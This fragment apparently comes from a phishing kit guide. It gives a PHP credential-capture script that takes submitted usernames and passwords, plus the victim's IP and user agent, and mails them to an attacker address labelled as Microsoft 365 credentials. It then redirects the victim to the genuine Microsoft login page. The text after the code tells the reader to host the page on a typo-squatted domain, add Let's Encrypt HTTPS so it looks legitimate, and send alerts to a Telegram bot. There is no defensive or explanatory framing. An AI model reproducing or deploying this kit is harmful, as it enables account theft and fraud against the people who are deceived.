```

**capture.php**:
```php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

mail("attacker@protonmail.com", "M365 Creds", "User: $user\nPass: $pass\nIP: $ip\nUA: $ua");
header("Location: https://login.microsoftonline.com/");
exit;
```

Host on a typo-squatted domain (micros0ft365.com). Use Let's Encrypt for HTTPS. Log to Telegram bot for real-time alerts.

